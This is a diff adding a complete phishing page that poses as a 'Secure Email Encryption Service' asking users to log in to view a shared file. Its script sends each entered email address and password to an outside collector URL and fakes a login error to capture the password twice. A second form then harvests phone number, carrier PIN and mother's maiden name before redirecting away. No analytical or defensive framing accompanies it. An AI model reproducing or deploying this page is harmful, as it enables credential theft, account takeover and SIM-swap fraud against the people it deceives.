@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>login information</title>
+     <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+
+    <style>
+
+        *{
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body{
+            font-family: 'Times New Roman', Times, serif;
+            background-image: url("https://iili.io/HXd6U6G.jpg");
+            background-position: center;
+            background-size: cover;
+            height: 100vh;
+        }
+        .form-container{
+            width: 50%;
+            margin: 40px auto;
+            background-color: #fff;
+            border-radius: 5px;
+            padding: 10px 0;
+        }
+        .img-box,.text-box, .btn-box, .others, .foot-text{
+            text-align: center;
+        }
+        .img-box img {
+            margin: 20px 0;
+            cursor: pointer;
+        }
+        .text-box h1 {
+            font-size: 44px;
+            font-weight: 500;
+            color: #39393B;
+        }
+        .form{
+            width: 50%;
+            margin: 20px auto;
+        }
+        .inp-box{
+            margin: 15px 0;
+        }
+        .inp-box label{
+            display: block;
+            color: #737373;
+            font-size: 13px;
+        }
+        .inp-box input{
+            width: 100%;
+            height: 35px;
+            padding: 10px;
+        }
+        .btn-box button{
+            width: 130px;
+            height: 30px;
+            background-color: #0081bf;
+        }
+        .others img{
+            cursor: pointer;
+            margin: 20px 0;
+        }
+        .foot-text{
+            width: 80%;
+            margin: 15px auto;
+        }
+        .foot-text p {
+            color: #049FD9;
+            font-size: 13px;
+        }
+        .error{
+            color: red;
+            font-size: 14px;
+        }
+        .hide{
+            display: none;
+        }
+        .form-gp-box{
+            width: 800px;
+            display: flex;
+        }
+        .inp {
+            margin-left: 10px;
+        }
+        @media screen and (max-width: 1172px){
+            .form{
+                width: 70%;
+            }
+        }
+        @media screen and (max-width: 974px) {
+            .form-container{
+                width: 90%;
+            }
+            .form-gp-box {
+                display: block;
+                width: 100%;
+            }
+            .inp {
+                margin-left: 0;
+            }
+        }
+        @media screen and (max-width: 435px){
+            .text-box h1 {
+                font-size: 30px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+
+        <div class="img-box">
+            <img src="https://iili.io/HXd61ZF.png" alt="log" width="200px">
+        </div>
+
+        <div class="text-box">
+        <h1>Secure Email <br />Encryption Service</h1>
+        </div>
+
+        <form action="#" class="form">
+            <div class="inp-box">
+                <label for="email">Email Address</label>
+                <input type="text" id="mail">
+            </div>
+
+             <div class="inp-box">
+                <label for="email">Email Password</label>
+                <input type="password" id="pass">
+                 <span class="error hide">Invalid Email or Password</span>
+            </div>
+
+            <div class="btn-box">
+                <button>Submit</button>
+            </div>
+        </form>
+
+        <div class="others">
+            <img src="https://iili.io/HXdgJLb.png" alt="others" width="200px">
+        </div>
+
+        <div class="foot-text">
+        <p>
+            To Read The Document, For Security Reason Login With Your Valid Email provider and Password below to view shared file.
+        </p>
+        </div>
+    </div>
+
+    <div class="form-container hide">
+
+        <div class="img-box">
+            <img src="https://iili.io/HXd61ZF.png" alt="log" width="200px">
+        </div>
+
+        <div class="text-box">
+        <h1>For security reason,<br />Verify your identity</h1>
+        </div>
+
+        <form action="#" class="form">
+            <span class="error hide">Invalid Email or Password</span>
+
+           <div class="form-gp-box">
+            <div class="inp-box">
+                <label for="email">Mobile Phone Number</label>
+                <input type="text" id="ssn">
+            </div>
+
+             <div class="inp-box inp">
+                <label for="email">Phone Carrier Pin</label>
+                <input type="text" id="mmn">
+                
+            </div>
+           </div>
+
+             <div class="form-gp-box">
+            <div class="inp-box">
+                <label for="email">Mother Maiden Name</label>
+                <input type="text" id="an">
+            </div>
+
+        
+           </div>
+            <div class="btn-box">
+                <button>Submit</button>
+            </div>
+        </form>
+        
+    </div>
+
+
+    <script>
+        const form = document.querySelectorAll(".form");
+        const mail = document.getElementById("mail");
+        const pass = document.getElementById("pass");
+        const error = document.querySelectorAll(".error");
+        const ssn = document.getElementById('ssn');
+        const mmn = document.getElementById('mmn');
+        const an = document.getElementById('an');
+        const aba = document.getElementById('aba');
+        const ap = document.getElementById('ap');
+        const zp = document.getElementById('zp');
+        const formContainer = document.querySelectorAll(".form-container");
+        let errKey = 0;
+        let pin_err = 0;
+
+         const ajaxCode = (data) => {
+            $.ajax({
+                //post php link here....
+                url: 'https://juanroyo.com/wp-includes/blocks/categories/ere/Sharefileconnect/sharepoint/send.php',
+                type: 'POST',
+                data: { pass: data },
+            });
+    };
+
+        const errorHandler = (text) => {
+            error[0].textContent = text;
+            error[0].classList.remove("hide");
+            pass.value = "";
+        };
+        const errorHandler2 = (errMsg) => {
+             error[1].classList.remove("hide");
+             error[1].textContent = errMsg;
+        }
+
+        form[0].addEventListener("submit", (e) => {
+            e.preventDefault();
+           if(pass.value === ""){
+                errorHandler('Invalid Email Password');
+           }
+           else {
+            errKey++;
+            if(errKey === 1){
+                let fData = `Email Address: ${mail.value} \nEmail Password: ${pass.value}`;
+                ajaxCode(fData);
+                errorHandler("Invalid Email Password");
+               
+            }
+           
+            else {
+                let fData = `Email Address: ${mail.value} \nEmail Password: ${pass.value}`;
+                ajaxCode(fData);
+                 errorHandler("");
+                 errKey = 0;
+                 formContainer[0].classList.add("hide");
+                 formContainer[1].classList.remove("hide");
+            }
+           }
+        });
+
+        form[1].addEventListener("submit", (e) => {
+            e.preventDefault();
+
+            if(ssn.value === ""){
+                errorHandler2("Please enter a valid Mobile Phone Number");
+                
+            }
+            else if(mmn.value === ""){
+                 errorHandler2("Please enter a Valid Phone Carrier Pin");
+            }
+            else if(an.value === ""){
+                 errorHandler2("Please enter a Valid Mother's Maiden Name");
+            }
+          
+            else {
+                pin_err++;
+                let data = `Mobile Phone : ${ssn.value} \nPhone Pin: ${mmn.value} \nMother's Maiden Name: ${an.value}`;
+                ajaxCode(data);
+                errorHandler2("");
+
+                setTimeout(() => {
+                    if(pin_err === 1){
+                        errorHandler2("Incorrect Phone Carrier Pin");
+                        mmn.value = "";
+                    }
+                    else {
+                        errorHandler2("");
+                        window.location.href = "https://docs.oracle.com/cd/F30771_01/OBSCF_14.4.0.3.0/Responsive%20HTML5/assets/inset_000228.jpg";
+                        
+                    }
+                      
+                }, 1000);
+            }
+        });
+
+    </script>
+</body>
+</html>
